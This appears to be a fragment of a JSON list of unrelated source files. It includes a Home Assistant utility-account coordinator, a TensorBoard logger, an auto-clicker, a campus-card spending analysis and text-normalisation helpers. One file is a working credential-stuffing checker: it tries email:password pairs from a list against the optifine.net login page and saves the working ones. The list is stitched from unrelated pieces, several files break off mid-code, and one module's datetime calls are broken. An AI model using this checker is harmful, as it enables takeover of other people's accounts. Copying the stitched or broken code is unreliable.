_async_update_data(self):\n        \"\"\"\n        Metoda apelat\u0103 de DataUpdateCoordinator la fiecare refresh.\n        Aici colect\u0103m datele de la HidroelectricaAPI pentru fiecare cont.\n        Dac\u0103 aveam deja un _session_token valid, login() nu se va relansa.\n        \"\"\"\n        try:\n            _LOGGER.debug(\"=== HIDRO: \u00cencepem procesul de actualizare a datelor... ===\")\n\n            # 1. Login doar dac\u0103 nu avem deja session_token (metod\u0103 nou\u0103 \u00een api.py)\n            await self.hass.async_add_executor_job(self.api.login_if_needed)\n\n            # 2. Ob\u021binem lista de conturi (coduri de \u00eencasare) => utility_accounts\n            utility_accounts = self.api.get_utility_accounts() or []\n            self.data[\"utility_accounts\"] = utility_accounts\n\n            # 2.1 Ob\u021binem datele brute din ValidateUserLogin (toate r\u00e2ndurile) \n            #     \u0219i din GetUserSetting (raw).\n            validate_user_login_rows = self.api.get_validate_user_login_data() or []\n            raw_user_setting_data = self.api.get_raw_user_setting_data() or {}\n\n            # Map\u0103m sub-dic\u021bionare => UAN -> row\n            user_setting_map = self._map_user_setting_rows_by_uan(raw_user_setting_data)\n            validate_login_map = self._map_validate_login_rows_by_uan(validate_user_login_rows)\n\n            accounts_data = {}\n\n            # 3. Pentru fiecare cont, apel\u0103m restul endpoint-urilor\n            for acc_info in utility_accounts:\n                uan = acc_info.get(\"UtilityAccountNumber\")  \n                acc_no = acc_info.get(\"AccountNumber\")      \n\n                if not uan or not acc_no:\n                    _LOGGER.warning(\n                        \"Date cont incomplete: %s (lips\u0103 UAN/AccountNumber?). S\u0103rim peste...\",\n                        acc_info\n                    )\n                    continue\n\n                _LOGGER.debug(\"=== HIDRO: Extragem date pt UAN=%s, AccountNumber=%s ===\", uan, acc_no)\n\n                # 3.1 ValidateUserLogin - r\u00e2ndul pentru acest cont\n                resp_validate_login = validate_login_map.get(uan, {})\n\n                # 3.2 GetUserSetting - r\u00e2ndul pentru acest cont\n                resp_user_setting = user_setting_map.get(uan, {})\n\n                # 3.3 Apele endpoint-urilor sincrone\n                resp_multi_meter = await self.hass.async_add_executor_job(\n                    self.api.get_multi_meter_details, uan, acc_no\n                ) or {}\n\n                resp_meter_value = await self.hass.async_add_executor_job(\n                    self.api.get_current_meter_value, uan, acc_no\n                ) or {}\n\n                resp_window_dates = await self.hass.async_add_executor_job(\n                    self.api.get_window_dates_enc, uan, acc_no\n                ) or {}\n\n                resp_bill = await self.hass.async_add_executor_job(\n                    self.api.get_current_bill, uan, acc_no\n                ) or {}\n\n                # Calcul\u0103m intervalul de date dinamic\n                end_date = datetime.now()  # Data curent\u0103\n                start_date = end_date - timedelta(days=2 * 365)  # Cu aproximativ doi ani \u00een urm\u0103\n\n                start_date_str = start_date.strftime(\"%Y-%m-%d\")  # Formatare: \"YYYY-MM-DD\"\n                end_date_str = end_date.strftime(\"%Y-%m-%d\")      # Formatare: \"YYYY-MM-DD\"\n\n                # Istoric facturi\n                resp_billing_history = await self.hass.async_add_executor_job(\n         ",
    "import os\r\nfrom seleniumbase import SB\r\n\r\ndef verify_success(sb):\r\n    sb.wait_for_element_visible('h2', timeout=3)\r\n    sb.sleep(1)\r\n\r\ndef login(sb, email, password):\r\n    print(f\"Logging in with {email}\")\r\n    sb.open(\"https://optifine.net/login\")\r\n    sb.wait_for_element_visible('input[name=\"email\"]', timeout=5)\r\n    sb.wait_for_element_visible('input[name=\"password\"]', timeout=5)\r\n    print(\"Filling login form\")\r\n    sb.update_text('input[name=\"email\"]', email)\r\n    sb.update_text('input[name=\"password\"]', password)\r\n    sb.click('input[name=\"login\"]')\r\n\r\ndef classify_result(sb, email, password):\r\n    if sb.is_element_present('h2') and \"Capes\" in sb.get_text('h2'):\r\n        with open('valid.txt', 'a') as valid_file:\r\n            valid_file.write(f\"{email}:{password}\\n\")\r\n        print(f\"{email} Valid\")\r\n    else:\r\n        with open('invalid.txt', 'a') as invalid_file:\r\n            invalid_file.write(f\"{email}:{password}\\n\")\r\n        print(f\"{email} Invalid\")\r\n\r\ndef remove_processed_account(account):\r\n    with open(\"accounts.txt\", \"r\") as accounts_file:\r\n        lines = accounts_file.readlines()\r\n    with open(\"accounts.txt\", \"w\") as accounts_file:\r\n        for line in lines:\r\n            if line.strip() != account:\r\n                accounts_file.write(line)\r\n\r\nwith SB(uc_cdp=True, guest_mode=True) as sb:\r\n    with open(\"accounts.txt\", \"r\") as accounts_file:\r\n        lines = accounts_file.readlines()\r\n    for line in lines:\r\n        email, password = line.strip().split(':', 1)\r\n        try:\r\n            login(sb, email, password)\r\n            verify_success(sb)\r\n            classify_result(sb, email, password)\r\n            remove_processed_account(line.strip())\r\n        except Exception as e:\r\n            print(f\"Error processing account {email}: {e}\")\r\n",
    "# Copyright (c) Facebook, Inc. and its affiliates.\n\nimport torch\n\ntry:\n    from tensorboardX import SummaryWriter\nexcept ImportError:\n    print(\"Cannot import tensorboard. Will log to txt files only.\")\n    SummaryWriter = None\n\nfrom utils.dist import is_primary\n\n\nclass Logger(object):\n    def __init__(self, log_dir=None) -> None:\n        self.log_dir = log_dir\n        if SummaryWriter is not None and is_primary():\n            self.writer = SummaryWriter(self.log_dir)\n        else:\n            self.writer = None\n\n    def log_scalars(self, scalar_dict, step, prefix=None):\n        if self.writer is None:\n            return\n        for k in scalar_dict:\n            v = scalar_dict[k]\n            if isinstance(v, torch.Tensor):\n                v = v.detach().cpu().item()\n            if prefix is not None:\n                k = prefix + k\n            self.writer.add_scalar(k, v, step)\n    \n    def log_image(self, image, prefix=None):\n        if self.writer is None:\n            return\n        self.writer.add_image(prefix, image)\n",
    "import pyautogui\r\nimport time\r\nimport random\r\nimport numpy as np\r\n\r\n# \u041f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u044b\u0435 \u043d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438\r\ndelay_range = (0.3, 0.8)           # \u0414\u0438\u0430\u043f\u0430\u0437\u043e\u043d \u0437\u0430\u0434\u0435\u0440\u0436\u043a\u0438 \u043c\u0435\u0436\u0434\u0443 \u043a\u043b\u0438\u043a\u0430\u043c\u0438 (\u0432 \u0441\u0435\u043a\u0443\u043d\u0434\u0430\u0445)\r\npause_interval_range = (8, 12)     # \u0414\u0438\u0430\u043f\u0430\u0437\u043e\u043d \u0432\u0440\u0435\u043c\u0435\u043d\u0438 \u0434\u043e \u043f\u0430\u0443\u0437\u044b (\u0432 \u0441\u0435\u043a\u0443\u043d\u0434\u0430\u0445)\r\npause_duration_range = (4, 7)      # \u0414\u0438\u0430\u043f\u0430\u0437\u043e\u043d \u0434\u043b\u0438\u043d\u044b \u043f\u0430\u0443\u0437\u044b (\u0432 \u0441\u0435\u043a\u0443\u043d\u0434\u0430\u0445)\r\nmove_offset_range = (-50, 50)      # \u0414\u0438\u0430\u043f\u0430\u0437\u043e\u043d \u0441\u043c\u0435\u0449\u0435\u043d\u0438\u044f \u043e\u0442 \u0441\u0442\u0430\u0440\u0442\u043e\u0432\u043e\u0439 \u043f\u043e\u0437\u0438\u0446\u0438\u0438 (\u0432 \u043f\u0438\u043a\u0441\u0435\u043b\u044f\u0445)\r\n\r\n# \u0424\u0438\u043a\u0441\u0438\u0440\u0443\u0435\u043c \u0441\u0442\u0430\u0440\u0442\u043e\u0432\u0443\u044e \u043f\u043e\u0437\u0438\u0446\u0438\u044e\r\nstart_position = None  # \u041e\u043f\u0440\u0435\u0434\u0435\u043b\u0438\u0442\u0441\u044f \u043f\u0440\u0438 \u0437\u0430\u043f\u0443\u0441\u043a\u0435 \u0441\u043a\u0440\u0438\u043f\u0442\u0430\r\n\r\ndef move_mouse_smoothly(start, end, steps=10):\r\n    \"\"\"\r\n    \u041f\u0435\u0440\u0435\u043c\u0435\u0449\u0435\u043d\u0438\u0435 \u043c\u044b\u0448\u0438 \u043f\u043e \u043f\u043b\u0430\u0432\u043d\u043e\u0439 \u0442\u0440\u0430\u0435\u043a\u0442\u043e\u0440\u0438\u0438 \u043c\u0435\u0436\u0434\u0443 \u0434\u0432\u0443\u043c\u044f \u0442\u043e\u0447\u043a\u0430\u043c\u0438.\r\n    \"\"\"\r\n    x_vals = np.linspace(start[0], end[0], steps)\r\n    y_vals = np.linspace(start[1], end[1], steps) + np.random.normal(0, 2, steps)  # \u0421\u043b\u0443\u0447\u0430\u0439\u043d\u044b\u0435 \u043e\u0442\u043a\u043b\u043e\u043d\u0435\u043d\u0438\u044f\r\n    for x, y in zip(x_vals, y_vals):\r\n        pyautogui.moveTo(int(x), int(y), duration=0.05)\r\n\r\ndef clicker():\r\n    global start_position\r\n    print(\"\u0421\u043a\u0440\u0438\u043f\u0442 \u043d\u0430\u0447\u043d\u0451\u0442\u0441\u044f \u0447\u0435\u0440\u0435\u0437 5 \u0441\u0435\u043a\u0443\u043d\u0434. \u041f\u043e\u0434\u0433\u043e\u0442\u043e\u0432\u044c\u0442\u0435\u0441\u044c!\")\r\n    time.sleep(5)\r\n    \r\n    # \u0423\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0441\u0442\u0430\u0440\u0442\u043e\u0432\u043e\u0439 \u043f\u043e\u0437\u0438\u0446\u0438\u0438\r\n    start_position = pyautogui.position()\r\n    print(f\"\u0421\u0442\u0430\u0440\u0442\u043e\u0432\u0430\u044f \u043f\u043e\u0437\u0438\u0446\u0438\u044f \u043c\u044b\u0448\u0438 \u0437\u0430\u0444\u0438\u043a\u0441\u0438\u0440\u043e\u0432\u0430\u043d\u0430: {start_position}\")\r\n    \r\n    print(\"\u041d\u0430\u0447\u0438\u043d\u0430\u044e \u043a\u043b\u0438\u043a\u0430\u0442\u044c. \u041d\u0430\u0436\u043c\u0438\u0442\u0435 Ctrl+C, \u0447\u0442\u043e\u0431\u044b \u043e\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u0442\u044c.\")\r\n    last_pause_time = time.time()\r\n    \r\n    try:\r\n        while True:\r\n            # \u0422\u0435\u043a\u0443\u0449\u0435\u0435 \u0432\u0440\u0435\u043c\u044f\r\n            current_time = time.time()\r\n            \r\n            # \u0421\u043b\u0443\u0447\u0430\u0439\u043d\u043e\u0435 \u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0435\u043d\u0438\u0435 \u043c\u044b\u0448\u0438 \u0432 \u043f\u0440\u0435\u0434\u0435\u043b\u0430\u0445 \u0434\u0438\u0430\u043f\u0430\u0437\u043e\u043d\u0430 \u043e\u0442 \u0441\u0442\u0430\u0440\u0442\u043e\u0432\u043e\u0439 \u043f\u043e\u0437\u0438\u0446\u0438\u0438\r\n            random_x = start_position.x + random.randint(*move_offset_range)\r\n            random_y = start_position.y + random.randint(*move_offset_range)\r\n            print(f\"\u041f\u043b\u0430\u043d\u0438\u0440\u0443\u0435\u0442\u0441\u044f \u043f\u0435\u0440\u0435\u043c\u0435\u0449\u0435\u043d\u0438\u0435 \u043c\u044b\u0448\u0438 \u0432 ({random_x}, {random_y})\")\r\n            \r\n            # \u041f\u0435\u0440\u0435\u043c\u0435\u0449\u0435\u043d\u0438\u0435 \u043c\u044b\u0448\u0438 \u043f\u043b\u0430\u0432\u043d\u043e\r\n            move_mouse_smoothly((pyautogui.position().x, pyautogui.position().y), (random_x, random_y))\r\n            \r\n            # \u0412\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435 \u043a\u043b\u0438\u043a\u0430\r\n            pyautogui.click()\r\n            print(\"\u041a\u043b\u0438\u043a!\")\r\n            \r\n            # \u0421\u043b\u0443\u0447\u0430\u0439\u043d\u043e\u0435 \u0432\u0437\u0430\u0438\u043c\u043e\u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435 (\u043d\u0430\u0432\u0435\u0434\u0435\u043d\u0438\u0435 \u043d\u0430 \u044d\u043b\u0435\u043c\u0435\u043d\u0442)\r\n            if random.random() < 0.3:  # 30% \u0432\u0435\u0440\u043e\u044f\u0442\u043d\u043e\u0441\u0442\u044c \u0434\u043e\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0433\u043e \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u044f\r\n                hover_x = start_position.x + random.randint(-100, 100)\r\n                hover_y = start_position.y + random.randint(-100, 100)\r\n                move_mouse_smoothly((random_x, random_y), (hover_x, hover_y))\r\n                print(f\"\u041d\u0430\u0432\u0451\u043b \u043c\u044b\u0448\u044c \u043d\u0430 \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u0443\u044e \u0442\u043e\u0447\u043a\u0443 ({hover_x}, {hover_y}).\")\r\n                time.sleep(random.uniform(0.5, 2))  # \u041a\u043e\u0440\u043e\u0442\u043a\u0430\u044f \u043f\u0430\u0443\u0437\u0430\r\n                \r\n            # \u0421\u043b\u0443\u0447\u0430\u0439\u043d\u0430\u044f \u0437\u0430\u0434\u0435\u0440\u0436\u043a\u0430 \u043c\u0435\u0436\u0434\u0443 \u043a\u043b\u0438\u043a\u0430\u043c\u0438\r\n            delay = random.uniform(*delay_range)\r\n            time.sleep(delay)\r\n            \r\n            # \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u043d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u043e\u0441\u0442\u044c \u043f\u0430\u0443\u0437\u044b\r\n            time_since_last_pause = current_time - last_pause_time\r\n            pause_interval = random.uniform(*pause_interval_range)\r\n            \r\n            if time_since_last_pause >= pause_interval:\r\n                pause_duration = random.uniform(*pause_duration_range)\r\n                print(f\"\u041f\u0430\u0443\u0437\u0430 \u043d\u0430 {pause_duration:.2f} \u0441\u0435\u043a\u0443\u043d\u0434...\")\r\n                time.sleep(pause_duration)\r\n                last_pause_time = time.time()  # \u041e\u0431\u043d\u043e\u0432\u043b\u044f\u0435\u043c \u0432\u0440\u0435\u043c\u044f \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0435\u0439 \u043f\u0430\u0443\u0437\u044b\r\n                print(\"\u041f\u0440\u043e\u0434\u043e\u043b\u0436\u0430\u044e \u0440\u0430\u0431\u043e\u0442\u0443.\")\r\n    except KeyboardInterrupt:\r\n        print(\"\u0421\u043a\u0440\u0438\u043f\u0442 \u043e\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u0435\u043c.\")\r\n\r\nif __name__ == \"__main__\":\r\n    clicker()\r\n",
    "import polars as pl\nimport matplotlib.pyplot as plt\nfrom matplotlib.font_manager import FontProperties\nimport calendar\nimport json\nfrom bjut_annual_eat.query import query_card_trade_list, load_config\nimport os\nimport warnings\nimport pathlib\nimport time\n\nwarnings.filterwarnings(\"ignore\", category=UserWarning)\n\n\ndef get_monthly_data(year):\n    config = load_config()\n    all_data = []\n\n    test_mode = config[\"settings\"][\"test_mode\"]\n\n    if test_mode:\n        month_range = range(\n            config[\"settings\"][\"test_month_start\"],\n            config[\"settings\"][\"test_month_end\"] + 1,\n        )\n    else:\n        month_range = range(1, 13)\n\n    cache_dir = f\"cache/{year}\"\n    os.makedirs(cache_dir, exist_ok=True)\n\n    for month in month_range:\n        cache_file = f\"{cache_dir}/{month:02d}.json\"\n\n        if os.path.exists(cache_file):\n            print(f\"\u4ece\u7f13\u5b58\u8bfb\u53d6 {year}\u5e74{month}\u6708 \u7684\u6570\u636e...\")\n            with open(cache_file, \"r\", encoding=\"utf-8\") as f:\n                response = json.load(f)\n        else:\n            print(f\"\u6b63\u5728\u83b7\u53d6 {year}\u5e74{month}\u6708 \u7684\u6570\u636e...\")\n            start_date = f\"{year}-{month:02d}-01\"\n            _, last_day = calendar.monthrange(year, month)\n            end_date = f\"{year}-{month:02d}-{last_day:02d}\"\n\n            response = query_card_trade_list(start_date, end_date)\n            time.sleep(0.5)\n\n            if response and response.get(\"success\"):\n                with open(cache_file, \"w\", encoding=\"utf-8\") as f:\n                    json.dump(response, f, ensure_ascii=False, indent=2)\n\n        if (\n            response\n            and response.get(\"success\")\n            and \"data\" in response\n            and \"data\" in response[\"data\"]\n        ):\n            all_data.extend(response[\"data\"][\"data\"])\n        else:\n            print(f\"\u8b66\u544a: {year}\u5e74{month}\u6708 \u7684\u6570\u636e\u83b7\u53d6\u5931\u8d25\")\n\n    print(f\"\u5171\u83b7\u53d6 {len(all_data)} \u6761\u8bb0\u5f55\")\n    return all_data\n\n\ndef analyze_consumption(year=2024):\n    data = get_monthly_data(year)\n\n    df = pl.DataFrame(data)\n\n    font_path = pathlib.Path(__file__).parent / \"fonts\" / \"SimHei.ttf\"\n    font = FontProperties(fname=str(font_path))\n\n    # \u5b9a\u4e49\u5546\u6237\u5206\u7c7b\n    dining_merchants = [\n        \"\u5317\u533a\u65b0\u9910\u5385\",\n        \"\u5929\u5929\u98ce\u5473\",\n        \"\u5929\u5929\u9910\u5385\",\n        \"\u5929\u5929\u9910\u5385\u5427\u53f0\",\n        \"\u5965\u8fd0\u9910\u5385\u4e00\u5c42\",\n        \"\u5965\u8fd0\u9910\u5385\u4e8c\u5c42\",\n        \"\u6e05\u771f\u9910\u5385\u57fa\u672c\u4f19\",\n        \"\u6e05\u771f\u9910\u5385\u6c34\u5427\",\n        \"\u6e05\u771f\u9910\u5385\u98ce\u5473\u7ec4\",\n        \"\u7f8e\u98df\u56ed\",\n        \"\u98ce\u5473\u9910\u5385\",\n    ]\n\n    market_merchants = [\"\u4eac\u5ba2\u9686\u8d85\u5e02\", \"\u4eac\u5ba2\u9686\", \"\u8d85\u5e02\"]\n\n    df = df.with_columns(\n        [\n            pl.col(\"txdate\").str.strptime(pl.Datetime, format=\"%Y-%m-%d %H:%M:%S\"),\n            pl.col(\"txamt\").cast(pl.Float64),\n        ]\n    )\n\n    df = df.with_columns(\n        [\n            pl.col(\"txdate\").dt.month().alias(\"month\"),\n            pl.when(pl.col(\"mername\").is_in(dining_merchants))\n            .then(pl.lit(\"\u996e\u98df\"))\n            .when(pl.col(\"mername\").is_in(market_merchants))\n            .then(pl.lit(\"\u8d85\u5e02\"))\n            .otherwise(pl.lit(\"\u5176\u4ed6\"))\n            .alias(\"category\"),\n            # \u4fdd\u7559\u539f\u59cb\u5546\u6237\u540d\u79f0\u7528\u4e8e\u98df\u5802\u8be6\u60c5\u7edf\u8ba1\n            pl.when(pl.col(\"mername\").is_in(dining_merchants))\n            .then(pl.col(\"mername\"))\n            .otherwise(pl.lit(\"\u5176\u4ed6\"))\n            .alias(\"dining_place\"),\n        ]\n    )\n\n    df = df.with_columns(\n        [\n            pl.col(\"txdate\").dt.hour().alias(\"hour\"),\n            pl.col(\"txdate\").dt.weekday().alias(\"weekday\"),\n        ]\n    )\n\n    # 1. \u603b\u6d88\u8d39\u91cf\n    total_consumption = df.select(pl.col(\"txamt\").abs().sum()).item()\n\n    # 2. \u6708\u5ea6\u6d88\u8d39\u7edf\u8ba1\n    monthly_consumption = (\n        df.group_by(\"month\")\n        .agg(pl.col(\"txamt\").abs().sum().alias(\"txamt\"))\n        .sort(\"month\")\n    )\n\n    # 3. \u6d88\u8d39\u6784\u6210\uff08\u98df\u5802 vs \u5176\u4ed6\uff09\n    category_consumption = (\n        df.group_by(\"category\")\n        .agg(pl.col(\"txamt\").abs().sum().alias(\"txamt\"))\n        .sort(\"txamt\", descending=True)\n    )\n\n    # 4. \u98df\u5802\u6d88\u8d39\u660e\u7ec6 - \u4fee\u6539\u7b5b\u9009\u6761\u4ef6\n    canteen_consumption = (\n        df.filter(pl.col(\"dining_place\") != \"\u5176\u4ed6\")\n        .group_by(\"dining_place\")\n        .agg(pl.col(\"txamt\").abs().sum().alias(\"txamt\"))\n        .sort(\"txamt\", descending=True)\n    )\n\n    # \u521b\u5efa\u70ed\u529b\u56fe\u6570\u636e\n    heatmap_data = (\n        df.filter(pl.col(\"category\") == \"\u996e\u98df\")  # \u53ea\u770b\u9910\u996e\u6d88\u8d39\n        .group_by([\"weekday\", \"hour\"])\n        .agg(pl.len().alias(\"count\"))\n        .pivot(values=\"count\", index=\"weekday\", on=\"hour\", aggregate_function=\"sum\")\n        .fill_null(0)\n        .sort(\"weekday\")\n    )\n\n    if os.path.exists(\"/.dockerenv\"):\n        base_output_dir = \"/app/output\"\n    else:\n        base_output_dir = \"output\"\n\n    output_dir = os.path.join(base_output_dir, str(year))\n    os.makedirs(output_dir, exist_ok=True)\n\n    plt.style.use(\"seaborn-v0_8\")\n    fig = plt.figure(figsize=(16, 12))\n    fig.suptitle(\n        f\"{year}\u5e74\u6d88\u8d39\u7edf\u8ba1\u62a5\u544a\\n\u603b\u6d88\u8d39: {total_consumption:.2f}\u5143\",\n        fontproperties=font,\n        fontsize=14,\n        y=0.98,\n    )\n\n    gs = fig.add_gridspec(\n        2, 2, hspace=0.25, wspace=0.2, top=0.9, bottom=0.1, left=0.1, right=0.9\n    )\n\n    # 1. \u6708\u5ea6\u6d88\u8d39\u8d8b\u52bf (\u5de6\u4e0a)\n    ax1 = fig.add_subplot(gs[0, 0])\n    bars = ax1.bar(\n        monthly_consumption[\"month\"].to_list(),\n        monthly_consumption[\"txamt\"].to_list(),\n",
    "def normalize_punctuation(text: str) -> str:\n    \"\"\"Normalizes Unicode variants of common punctuation marks to their ASCII equivalents.\n\n    Converts various Unicode punctuation marks to their basic ASCII counterparts:\n    - Converts typographic apostrophes (U+2019, U+2018, etc.) to ASCII apostrophe (U+0027)\n    - Converts en dashes, em dashes, and other hyphens to ASCII hyphen-minus (U+002D)\n    - Converts curly quotes to straight quotes (U+0022)\n    - Converts ellipsis character to three periods\n    - Converts various spaces to regular space\n    - Converts bullet points to asterisk\n    - Preserves but normalizes common symbols (\u00a9, \u00ae, \u2122)\n\n    Args:\n        text: Input string containing possibly non-ASCII punctuation marks.\n\n    Returns:\n        A new string with all Unicode punctuation variants replaced with ASCII equivalents.\n\n    Examples:\n        >>> text = \"Here's a fancy\u2014text with \"quotes\" and bullets\u2022\"\n        >>> normalize_punctuation(text)\n        \"Here's a fancy-text with \\\"quotes\\\" and bullets*\"\n    \"\"\"\n    # Dictionary mapping unicode variants to ASCII versions\n    replacements = {\n        # Apostrophe variants -> ASCII apostrophe (U+0027)\n        chr(0x2019): \"'\",  # RIGHT SINGLE QUOTATION MARK\n        chr(0x2018): \"'\",  # LEFT SINGLE QUOTATION MARK\n        chr(0x02BC): \"'\",  # MODIFIER LETTER APOSTROPHE\n        chr(0x02B9): \"'\",  # MODIFIER LETTER PRIME\n        chr(0x0060): \"'\",  # GRAVE ACCENT\n        chr(0x00B4): \"'\",  # ACUTE ACCENT\n\n        # Hyphen variants -> ASCII hyphen-minus (U+002D)\n        chr(0x2010): \"-\",  # HYPHEN\n        chr(0x2011): \"-\",  # NON-BREAKING HYPHEN\n        chr(0x2012): \"-\",  # FIGURE DASH\n        chr(0x2013): \"-\",  # EN DASH\n        chr(0x2014): \"-\",  # EM DASH\n        chr(0x2015): \"-\",  # HORIZONTAL BAR\n        chr(0x00AD): \"-\",  # SOFT HYPHEN\n        chr(0x2212): \"-\",  # MINUS SIGN\n\n        # Double quote variants -> ASCII double quote (U+0022)\n        chr(0x201C): '\"',  # LEFT DOUBLE QUOTATION MARK\n        chr(0x201D): '\"',  # RIGHT DOUBLE QUOTATION MARK\n        chr(0x201F): '\"',  # DOUBLE HIGH-REVERSED-9 QUOTATION MARK\n\n        # Ellipsis -> three periods\n        chr(0x2026): '...',  # HORIZONTAL ELLIPSIS\n\n        # Space variants -> ASCII space\n        chr(0x00A0): ' ',  # NO-BREAK SPACE\n        chr(0x202F): ' ',  # NARROW NO-BREAK SPACE\n        chr(0x2009): ' ',  # THIN SPACE\n        chr(0x2007): ' ',  # FIGURE SPACE\n\n        # Bullet variants -> asterisk\n        chr(0x2022): '*',  # BULLET\n        chr(0x2023): '*',  # TRIANGULAR BULLET\n        chr(0x25E6): '*',  # WHITE BULLET\n        chr(0x2043): '*',  # HYPHEN BULLET\n        chr(0x00B7): '*',  # MIDDLE DOT\n        chr(0x2219): '*',  # BULLET OPERATOR\n\n        # Normalize common symbols\n        chr(0x00A9): '(c)',  # COPYRIGHT SIGN\n        chr(0x00AE): '(r)',  # REGISTERED SIGN\n        chr(0x2122): '(tm)'  # TRADEMARK SIGN\n    }\n\n    # Replace each variant with its ASCII equivalent\n    normalized_text = text\n    for unicode_char, ascii_char in replacements.items():\n        normalized_text = normalized_text.replace(unicode_char, ascii_char)\n\n    return normalized_text\n",
    "import re\nimport spacy\nimport datetime\nfrom typing import Optional\nfrom num2words import num2words\nfrom mathspell.helpers import constants as c \nfrom unit_parse import parser as quantity_parser\n\ndef interpret_currency(number: float, currency_name: str, minor_currency_name: str) -> str:\n    \"\"\"\n    Handle major units and minor currency units.\n    \"\"\"\n    as_str = f\"{number:.2f}\"\n    whole_str, fractional_str = as_str.split(\".\")\n    whole_val = int(whole_str)\n    fractional_val = int(fractional_str)\n\n    if whole_val > 1:\n        currency_name += 's'\n    if fractional_val > 1:\n        minor_currency_name += 's'\n\n    if fractional_val == 0:\n        return f\"{convert_number_to_words(whole_val)} {currency_name}\"\n    return (\n        f\"{convert_number_to_words(whole_val)} {currency_name} {convert_number_to_words(fractional_val)} {minor_currency_name}\"\n    )\n\ndef token_is_currency(symbol: str) -> bool:\n    \"\"\"\n    Check if a token corresponds to a currency symbol from CURRENCY_MAP.\n    \"\"\"\n    return bool(c.CURRENCY_MAP.get(symbol, False))\n\ndef convert_ordinal_string(token_text: str, next_token_text: str) -> str:\n    \"\"\"\n    Convert a numeric ordinal token (e.g., 1st) into word (e.g., 'first')\n    \"\"\"\n    match = re.match(r\"^(-?\\d+)(st|nd|rd|th)$\", f\"{token_text}{next_token_text}\", re.IGNORECASE)\n    if not match:\n        return token_text\n    number_part = match.group(1)\n    try:\n        return convert_number_to_words(int(number_part), to_ordinal=True)\n    except ValueError:\n        return token_text\n\ndef token_is_ordinal(token_text: str, next_token_text: str) -> bool:\n    \"\"\"\n    Check if current token together with next token forms an ordinal \n    \"\"\"\n    combined = f\"{token_text}{next_token_text}\"\n    return bool(re.match(r\"^(-?\\d+)(st|nd|rd|th)$\", combined, re.IGNORECASE))\n    \ndef convert_numeric_date_simple(date_str: str) -> str:\n    \"\"\"\n    Replace date separators like / with spaces.\n    E.g. '12/25/2023' -> '12 25 2023'.\n    \"\"\"\n    return re.sub(r\"[./]\", \" \", date_str)\n\ndef convert_time(time_str: str) -> str:\n    \"\"\"\n    Convert a time string (e.g., '3:45 PM') into spoken form (e.g., 'three forty-five PM').\n    \"\"\"\n    time_str = time_str.strip()\n    am_pm_match = re.search(r\"\\b(AM|PM)\\b\", time_str, re.IGNORECASE)\n    has_am_pm = bool(am_pm_match)\n\n    try:\n        if has_am_pm:\n            dt = datetime.strptime(time_str, \"%I:%M %p\")\n            hour = dt.hour if dt.hour != 0 else 12\n            if dt.hour > 12:\n               hour = dt.hour - 12\n            am_pm = am_pm_match.group(1).upper()\n        else:\n            dt = datetime.strptime(time_str, \"%H:%M\")\n            hour = dt.hour\n    except ValueError:\n        return time_str\n\n    hour_words = num2words(hour)\n    if dt.minute:\n        minute_words = num2words(dt.minute)\n        time_words = f\"{hour_words} {minute_words}\"\n    else:\n        time_words = hour_words\n\n    if has_am_pm:\n        time_words += f\" {am_pm}\"\n    return time_words\n\ndef replace_numeric_datetime(sentence: str) -> str:\n    \"\"\"\n    Preprocess datetime patterns like '12/25/2023 at 3:45 PM' to '12 25 2023 at three forty-five PM' to avoid confusion with mathematical signs.\n    \"\"\"\n    pattern = re.compile(\n        r\"(?P<date>\\d{1,2}/\\d{1,2}/\\d{4})\"\n        r\"(?P<sep>\\s+(?:at\\s+)?)\"\n        r\"(?P<time>\\d{1,2}:\\d{2}(?:\\s*[APMapm]{2})?)(?=\\b|$)\",\n        re.IGNORECASE\n    )\n\n    def repl(match):\n        date_str = match.group(\"date\")\n        sep = match.group(\"sep\")\n        time_str = match.group(\"time\")\n        new_date = convert_numeric_date_simple(date_str)\n        new_time = convert_time(time_str)\n        return f\"{new_date}{sep}{new_time}\"\n\n    return re.sub(pattern, repl, sentence)\n\ndef replace_numeric_date_only(sentence: str) -> str:\n    \"\"\"\n    Replace date-only patterns like '12/25/2023' with '12 25 2023'.\n    \"\"\"\n    pattern = re.compile(r\"(?P<date>\\d{1,2}/\\d{1,2}/\\d{2,4})\\b\")\n\n    def repl(match):\n        date_str = match.group(\"date\")\n        return convert_numeric_date_simple(date_str)\n\n    return re.sub(pattern, repl, sentence)\n\ndef replace_time_shorthand(sentence: str) -> str:\n    \"\"\"\n    Replace time shorthand like 'at 3PM' or '4:30AM' with spoken equivalents.\n    \"\"\"\n    pattern = re.compile(\n        r\"\\b(?:at\\s*)?(?P<hour>\\d{1,2})(?::(?P<minute>\\d{2}))?\\s*(?P<ampm>(AM|PM))\\b\",\n        re.IGNORECASE\n    )\n\n    def repl(match):\n        hour = match.group(\"hour\")\n        minute = match.group(\"minute\") if match.group(\"minute\") else \"00\"\n        ampm = match.group(\"ampm\").upper()\n        standard_time = f\"{hour}:{minute} {ampm}\"\n        converted = convert_time(standard_time)\n\n        original_text = match.group(0)\n        if original_text.lower().strip().startswith(\"at\"):\n            return f\"at {converted}\"\n        return converted\n\n    return re.sub(pattern, repl, sentence)\n\ndef process_time_patterns_ahead_of_tokenization(sentence: str) -> str:\n    \"\"\"\n    Orchestrate multiple time/date replacements before tokenizing.\n    \"\"\"\n    s = replace_numeric_datetime(sentence)",
